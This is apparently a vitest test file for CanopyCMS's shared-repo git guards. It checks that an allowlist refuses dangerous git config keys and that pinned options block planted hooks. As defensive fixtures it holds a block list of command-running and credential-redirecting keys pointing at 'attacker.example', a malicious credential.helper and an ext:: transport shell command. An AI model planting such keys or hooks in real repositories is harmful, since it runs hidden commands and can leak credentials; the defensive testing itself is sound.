/**
 * The two layers worker/shared-repo-git.ts puts between the worker and a Lambda-writable
 * repository, each tested on its own with real git:
 *
 * - the allowlist check accepts every repository shape CanopyCMS has ever written and refuses
 *   each key that can run a command or redirect a transfer;
 * - the `-c` pins stop everything they name even with the check skipped (the race the check
 *   cannot close), and do NOT stop filter or merge drivers, which is why the check exists.
 */

import { execFile } from 'node:child_process'
import fs from 'node:fs/promises'
import os from 'node:os'
import path from 'node:path'
import { promisify } from 'node:util'

import { simpleGit, type SimpleGit } from 'simple-git'
import { afterEach, beforeEach, describe, expect, it } from 'vitest'

import { GitManager, REMOTE_GIT_CONFIG, ensureRemoteGitConfig } from '../git-manager'
import { initTestRepo } from '../test-utils'
import {
  UntrustedRepoConfigError,
  assertSharedRepoConfig,
  fetchFromRemoteGit,
  mirrorGitOptions,
  pinnedReceivePack,
  pinnedUploadPack,
  sharedRepoGit,
  sharedRepoGitOptions,
} from './shared-repo-git'

const execFileAsync = promisify(execFile)

let root: string
let sentinel: string

beforeEach(async () => {
  root = await fs.realpath(await fs.mkdtemp(path.join(os.tmpdir(), 'canopy-shared-repo-git-')))
  sentinel = path.join(root, 'sentinel.log')
})

afterEach(async () => {
  await fs.rm(root, { recursive: true, force: true })
})

const sentinelLines = async () =>
  (await fs.readFile(sentinel, 'utf8').catch(() => '')).split('\n').filter(Boolean)
const record = (label: string) => `echo ${label} >> '${sentinel}'`

/** Plain git, which (unlike simple-git) writes any key. */
async function setConfig(file: string, key: string, value: string): Promise<void> {
  await execFileAsync('git', ['config', '--file', file, '--add', key, value])
}

/** A bare "remote.git" seeded with one commit on main, and a clone of it on `feature`. */
async function sharedPair(): Promise<{ remote: string; clone: string; cloneGit: SimpleGit }> {
  const seed = path.join(root, 'seed')
  await fs.mkdir(seed)
  const seedGit = await initTestRepo(seed)
  await seedGit.raw(['checkout', '-q', '-b', 'main'])
  await fs.writeFile(path.join(seed, 'a.txt'), 'a\n')
  await seedGit.add('.')
  await seedGit.commit('seed')
  const remote = path.join(root, 'remote.git')
  await simpleGit().raw(['clone', '-q', '--bare', seed, remote])
  await execFileAsync('git', ['--git-dir', remote, 'remote', 'remove', 'origin'])
  const clone = path.join(root, 'clone')
  await simpleGit().raw(['clone', '-q', '--branch', 'main', remote, clone])
  const cloneGit = simpleGit({ baseDir: clone })
  await cloneGit.addConfig('user.name', 'Test Bot')
  await cloneGit.addConfig('user.email', 'test@canopycms.test')
  await cloneGit.raw(['checkout', '-q', '-b', 'feature'])
  await fs.writeFile(path.join(clone, 'b.txt'), 'b\n')
  await cloneGit.add('.')
  await cloneGit.commit('feature work')
  // main moves on, so the clone has something to fetch, rebase onto and merge.
  await fs.writeFile(path.join(seed, 'c.txt'), 'c\n')
  await seedGit.add('.')
  await seedGit.commit('upstream')
  await seedGit.raw(['push', '-q', remote, 'main:main'])
  return { remote, clone, cloneGit }
}

describe('assertSharedRepoConfig: every shape CanopyCMS writes passes', () => {
  it('a content workspace and a settings workspace, as GitManager provisions them', async () => {
    const { remote } = await sharedPair()
    for (const [name, branchType] of [
      ['content', 'content'],
      ['settings', 'orphan'],
    ] as const) {
      const workspacePath = path.join(root, name)
      const manager = await GitManager.initializeWorkspace({
        workspacePath,
        branchName: name === 'content' ? 'main' : 'canopycms-settings-prod',
        mode: 'dev',
        baseBranch: 'main',
        remoteUrl: remote,
        branchType,
        gitBotAuthorName: 'Bot',
        gitBotAuthorEmail: 'bot@canopycms.test',
        gitExcludePattern: '.canopy-meta/',
      })
      await manager.ensureAuthor({ name: 'Editor', email: 'editor@canopycms.test' })
      await manager.push()
      await expect(assertSharedRepoConfig(workspacePath, 'worktree')).resolves.toBeUndefined()
    }
  })

  it('a sparse branch clone staged the way branch provisioning stages one', async () => {
    const { remote } = await sharedPair()
    const workspacePath = path.join(root, 'sparse')
    await GitManager.cloneWorkspace(remote, workspacePath, 'main', {
      noCheckout: true,
      remoteName: 'origin',
      config: { 'canopycms.managed': 'true', 'user.name': 'Bot', 'user.email': 'b@c.test' },
    })
    const manager = new GitManager({ repoPath: workspacePath, baseBranch: 'main' })
    await manager.setSparseCone(['content'])
    await manager.checkoutFreshClone('main')
    await manager.ensureGitExclude('.canopy-meta/')
    const keys = await execFileAsync('git', ['-C', workspacePath, 'config', '--list', '--local'])
    expect(keys.stdout).toMatch(/^extensions\.worktreeconfig=true$/m)
    await expect(assertSharedRepoConfig(workspacePath, 'worktree')).resolves.toBeUndefined()
  })

  it("dev's simulated remote, and a remote.git a pre-scrub worker cloned from GitHub", async () => {
    const source = path.join(root, 'source')
    await fs.mkdir(source)
    const sourceGit = await initTestRepo(source)
    await sourceGit.raw(['checkout', '-q', '-b', 'main'])
    await fs.writeFile(path.join(source, 'x.txt'), 'x\n')
    await sourceGit.add('.')
    await sourceGit.commit('x')
    const simulated = path.join(root, 'simulated.git')
    await GitManager.ensureLocalSimulatedRemote({
      remotePath: simulated,
      sourcePath: source,
      baseBranch: 'main',
    })
    await expect(assertSharedRepoConfig(simulated, 'bare')).resolves.toBeUndefined()

    const legacy = path.join(root, 'legacy-remote.git')
    await simpleGit().raw(['clone', '-q', '--bare', source, legacy])
    await ensureRemoteGitConfig(legacy)
    const listed = (await execFileAsync('git', ['--git-dir', legacy, 'config', '--list'])).stdout
    expect(listed).toMatch(/^remote\.origin\.url=/m)
    for (const [key] of REMOTE_GIT_CONFIG) expect(listed.toLowerCase()).toContain(key.toLowerCase())
    await expect(assertSharedRepoConfig(legacy, 'bare')).resolves.toBeUndefined()
  })
})

describe('assertSharedRepoConfig: refuses what can run a command or redirect a transfer', () => {
  const REFUSED: [key: string, value: string][] = [
    ['include.path', '/elsewhere.cfg'],
    ['includeIf.gitdir:/.path', '/elsewhere.cfg'],
    ['url.https://attacker.example/.insteadOf', 'https://x-access-token'],
    ['url.https://attacker.example/.pushInsteadOf', 'https://github.com/'],
    ['http.proxy', 'http://attacker.example:8080'],
    ['http.https://github.com.sslVerify', 'false'],
    ['http.extraHeader', 'X: y'],
    ['credential.helper', '!sh -c "cat > /tmp/x"'],
    ['credential.https://github.com.helper', 'store'],
    ['core.hooksPath', '/elsewhere'],
    ['core.fsmonitor', 'sh -c true'],
    ['core.sshCommand', 'sh -c true'],
    ['core.askPass', 'sh -c true'],
    ['core.gitProxy', 'sh -c true'],
    ['core.alternateRefsCommand', 'sh -c true'],
    ['core.worktree', '/elsewhere'],
    ['core.editor', 'sh -c true'],
    ['core.pager', 'sh -c true'],
    ['core.attributesFile', '/elsewhere'],
    ['sequence.editor', 'sh -c true'],
    ['filter.lfs.smudge', 'sh -c true'],
    ['filter.lfs.clean', 'sh -c true'],
    ['filter.lfs.process', 'sh -c true'],
    ['merge.ours.driver', 'sh -c true'],
    ['diff.x.command', 'sh -c true'],
    ['diff.x.textconv', 'sh -c true'],
    ['diff.external', 'sh -c true'],
    ['hook.x.command', 'sh -c true'],
    ['hook.x.event', 'post-checkout'],
    ['remote.origin.pushurl', 'https://attacker.example/'],
    ['remote.origin.uploadpack', 'sh -c true'],
    ['remote.origin.receivepack', 'sh -c true'],
    ['remote.origin.proxy', 'http://attacker.example'],
    ['remote.origin.vcs', 'x'],
    ['protocol.ext.allow', 'always'],
    ['gpg.program', 'sh -c true'],
    ['commit.gpgSign', 'true'],
    ['uploadpack.packObjectsHook', 'sh -c true'],
    ['receive.procReceiveRefs', 'refs/heads'],
    ['submodule.recurse', 'true'],
    ['safe.directory', '*'],
  ]

  /** Section and variable lowercased, a subsection (which may hold dots) as written. */
  const asGitPrintsIt = (key: string) => {
    const first = key.indexOf('.')
    const last = key.lastIndexOf('.')
    return (
      key.slice(0, first).toLowerCase() + key.slice(first, last) + key.slice(last).toLowerCase()
    )
  }

  it.each(REFUSED)('%s', async (key, value) => {
    const { remote } = await sharedPair()
    await setConfig(path.join(remote, 'config'), key, value)

    const err = await assertSharedRepoConfig(remote, 'bare').catch((e: unknown) => e)

    expect(err).toBeInstanceOf(UntrustedRepoConfigError)
    expect((err as UntrustedRepoConfigError).keys).toEqual([
      { key: asGitPrintsIt(key), file: path.join(remote, 'config') },
    ])
  })

  it('names the file and the fix, and never the value, which can be a credential', async () => {
    const { clone } = await sharedPair()
    const file = path.join(clone, '.git', 'config')
    await setConfig(file, 'url.https://attacker.example/x.insteadOf', 'SECRET-VALUE-1')
    await setConfig(file, 'http.extraHeader', 'Authorization: SECRET-VALUE-2')

    const err = await assertSharedRepoConfig(clone, 'worktree').catch((e: unknown) => e)

    const message = (err as Error).message
    expect(message).not.toMatch(/SECRET-VALUE/)
    expect(message).toBe(
      `Refusing to run git in ${clone}: its git config holds 2 settings CanopyCMS never writes, ` +
        `which can make the worker run a command or send its GitHub credential elsewhere ` +
        `(url.https://attacker.example/x.insteadof in ${file}; http.extraheader in ${file}). ` +
        `Find out how they got there, then remove them: ` +
        `git config --file '${file}' --unset-all 'url.https://attacker.example/x.insteadof' && ` +
        `git config --file '${file}' --unset-all 'http.extraheader'`,
    )
  })

  it('refuses a config git cannot parse, rather than assuming it is clean', async () => {
    const { remote } = await sharedPair()
    await fs.appendFile(path.join(remote, 'config'), '\n[core\n\tbroken\n')

    await expect(assertSharedRepoConfig(remote, 'bare')).rejects.toThrow(
      /^Refusing to run git in \S+remote\.git: .*\(unreadable: .*bad config line/,
    )
  })

  it("reads a clone's own .git, never a repository above it", async () => {
    const outer = path.join(root, 'outer')
    await fs.mkdir(outer)
    await initTestRepo(outer)
    await setConfig(path.join(outer, '.git', 'config'), 'core.fsmonitor', 'x')
    const notAClone = path.join(outer, 'not-a-clone')
    await fs.mkdir(notAClone)

    await expect(assertSharedRepoConfig(notAClone, 'worktree')).rejects.toThrow(/\(unreadable: /)
  })
})

describe('sharedRepoGit', () => {
  it('never runs in a repository above a clone whose .git has gone', async () => {
    const outer = path.join(root, 'outer')
    await fs.mkdir(outer)
    await initTestRepo(outer)
    await setConfig(
      path.join(outer, '.git', 'config'),
      'core.fsmonitor',
      `${record('outer')}; true`,
    )
    const clone = path.join(outer, 'clone')
    await fs.mkdir(clone)

    await expect(sharedRepoGit(clone, 'worktree').status()).rejects.toThrow(/not a git repository/)
    expect(await sentinelLines()).toEqual([])
  })
})

describe('the pins, with the check skipped (a key planted after it ran)', () => {
  const HOOKS = [
    'pre-receive',
    'update',
    'post-receive',
    'post-update',
    'reference-transaction',
    'pre-push',
    'pre-rebase',
    'post-checkout',
    'post-merge',
    'post-rewrite',
    'prepare-commit-msg',
    'commit-msg',
    'post-commit',
    'post-index-change',
    'pre-auto-gc',
  ]

  async function plantEverythingPinnable(gitDir: string, label: string): Promise<void> {
    const hooksDir = path.join(gitDir, 'hooks')
    const plantedDir = path.join(gitDir, 'planted-hooks')
    for (const dir of [hooksDir, plantedDir]) {
      await fs.mkdir(dir, { recursive: true })
      for (const hook of HOOKS) {
        await fs.writeFile(path.join(dir, hook), `#!/bin/sh\n${record(`${label}:${hook}`)}\n`)
        await fs.chmod(path.join(dir, hook), 0o755)
      }
    }
    const config = path.join(gitDir, 'config')
    await setConfig(config, 'core.hooksPath', plantedDir)
    await setConfig(config, 'hook.planted.command', record(`${label}:config-hook`))
    for (const hook of HOOKS) await setConfig(config, 'hook.planted.event', hook)
    await setConfig(config, 'core.fsmonitor', `${record(`${label}:fsmonitor`)}; true`)
    await setConfig(config, 'credential.helper', `!${record(`${label}:credential-helper`)}; true`)
    await setConfig(config, 'core.alternateRefsCommand', `${record(`${label}:alt-refs`)}; true`)
    await setConfig(config, 'protocol.ext.allow', 'always')
    await setConfig(config, 'commit.gpgSign', 'true')
    await setConfig(config, 'gpg.program', `sh -c '${record(`${label}:gpg`)}; exit 1'`)
    await setConfig(config, 'submodule.recurse', 'true')
  }

  it('stop hooks, config hooks, fsmonitor, helpers, signing and transports in every operation the worker runs', async () => {
    const { remote, clone } = await sharedPair()
    await plantEverythingPinnable(remote, 'remote.git')
    await plantEverythingPinnable(path.join(clone, '.git'), 'clone')
    // Redirect the clone's fetch of remote.git to a command through the ext transport.
    await setConfig(
      path.join(clone, '.git', 'config'),
      `url.ext::sh -c "${record('clone:ext-transport')}" #.insteadOf`,
      remote,
    )
    // An alternate, so a fetch has alternate refs to ask about.
    await fs.writeFile(
      path.join(clone, '.git', 'objects', 'info', 'alternates'),
      `${path.join(remote, 'objects')}\n`,
    )

    const cloneGit = simpleGit({ baseDir: clone, ...sharedRepoGitOptions('worktree') })
    await cloneGit.status()
    // Fails on the ext pin, which is the point; the alternate and transport never ran.
    await expect(fetchFromRemoteGit(cloneGit, remote, 'main')).rejects.toThrow(
      /transport 'ext' not allowed/,
    )
    await execFileAsync('git', [
      'config',
      '--file',
      path.join(clone, '.git', 'config'),
      '--remove-section',
      `url.ext::sh -c "${record('clone:ext-transport')}" #`,
    ])
    await fetchFromRemoteGit(cloneGit, remote, 'main')
    await cloneGit.raw(['rebase', 'FETCH_HEAD'])
    await cloneGit.raw(['checkout', '-q', '-b', 'merged', 'FETCH_HEAD'])
    await cloneGit.raw(['merge', '--ff-only', 'feature']).catch(() => undefined)
    await cloneGit.raw(['sparse-checkout', 'set', '--cone', '--', 'content'])
    await cloneGit.raw(['sparse-checkout', 'disable'])
    await fs.writeFile(path.join(clone, 'd.txt'), 'd\n')
    await cloneGit.add('d.txt')
    await cloneGit.commit('worker commit')
    await cloneGit.raw([
      'push',
      `--receive-pack=${pinnedReceivePack()}`,
      '--end-of-options',
      remote,
      'merged:merged',
    ])

    const remoteGit = simpleGit({ baseDir: remote, ...sharedRepoGitOptions('bare') })
    const tip = (await remoteGit.raw(['--git-dir', remote, 'rev-parse', 'main'])).trim()
    await remoteGit.raw(['--git-dir', remote, 'update-ref', 'refs/heads/moved', tip])
    await remoteGit.raw(['--git-dir', remote, 'repack', '-a', '-d', '-q'])

    // The mirror's side of a transfer: upload-pack in remote.git, under its own pins.
    const mirror = path.join(root, 'mirror.git')
    await simpleGit().raw(['init', '-q', '--bare', mirror])
    await simpleGit({ baseDir: mirror, ...mirrorGitOptions() })
      .env({ PATH: process.env.PATH ?? '', HOME: process.env.HOME ?? '', GIT_DIR: mirror })
      .raw([
        'fetch',
        '--no-write-fetch-head',
        `--upload-pack=${pinnedUploadPack()}`,
        '--end-of-options',
        remote,
        `+${tip}:refs/staged`,
      ])

    expect(await sentinelLines()).toEqual([])
  })

  it('fetch remote.git itself, never a repository planted at remote.git/.git', async () => {
    const { remote, clone } = await sharedPair()
    const realTip = (
      await execFileAsync('git', ['--git-dir', remote, 'rev-parse', 'main'])
    ).stdout.trim()
    // Cloned beside it, then moved in: a clone into remote.git/.git would read its own target.
    const copy = path.join(root, 'copy.git')
    await execFileAsync('git', ['clone', '-q', '--bare', remote, copy])
    await execFileAsync('git', ['--git-dir', copy, 'update-ref', 'refs/heads/main', 'main~1'])
    await fs.rename(copy, path.join(remote, '.git'))

    const cloneGit = sharedRepoGit(clone, 'worktree')
    await fetchFromRemoteGit(cloneGit, remote, 'main')

    expect((await cloneGit.revparse(['FETCH_HEAD'])).trim()).toBe(realTip)
  })

  it('do NOT stop filter or merge drivers: the allowlist check is what refuses those', async () => {
    const { remote, clone, cloneGit: plain } = await sharedPair()
    await plain.raw(['checkout', '-q', 'main'])
    const gitDir = path.join(clone, '.git')
    await fs.writeFile(path.join(gitDir, 'info', 'attributes'), '*.txt filter=planted\n')
    await setConfig(
      path.join(gitDir, 'config'),
      'filter.planted.smudge',
      `sh -c '${record('smudge')}; cat'`,
    )

    const cloneGit = simpleGit({ baseDir: clone, ...sharedRepoGitOptions('worktree') })
    await fetchFromRemoteGit(cloneGit, remote, 'main')
    await cloneGit.raw(['merge', '--ff-only', 'FETCH_HEAD'])

    expect(await sentinelLines()).toContain('smudge')
    await expect(assertSharedRepoConfig(clone, 'worktree')).rejects.toThrow(
      /filter\.planted\.smudge/,
    )
  })

  it('are each safe to pass through sh -c, as the pinned pack commands are', () => {
    const configs = [
      ...(sharedRepoGitOptions('bare').config ?? []),
      ...(sharedRepoGitOptions('worktree').config ?? []),
      ...(mirrorGitOptions().config ?? []),
    ]
    for (const pin of configs) expect(pin).toMatch(/^[A-Za-z0-9._/-]+=[A-Za-z0-9._/-]*$/)
    for (const [command, program] of [
      [pinnedUploadPack(), ['upload-pack', '--strict']],
      [pinnedReceivePack(), ['receive-pack']],
    ] as const) {
      const words = command.split(' ')
      expect(words[0]).toBe('git')
      expect(words.slice(-program.length)).toEqual(program)
      const pins = words.slice(1, -program.length)
      expect(pins.length % 2).toBe(0)
      for (let i = 0; i < pins.length; i += 2) {
        expect(pins[i]).toBe('-c')
        expect(pins[i + 1]).toMatch(/^[A-Za-z0-9._/-]+=[A-Za-z0-9._/-]*$/)
      }
    }
  })
})
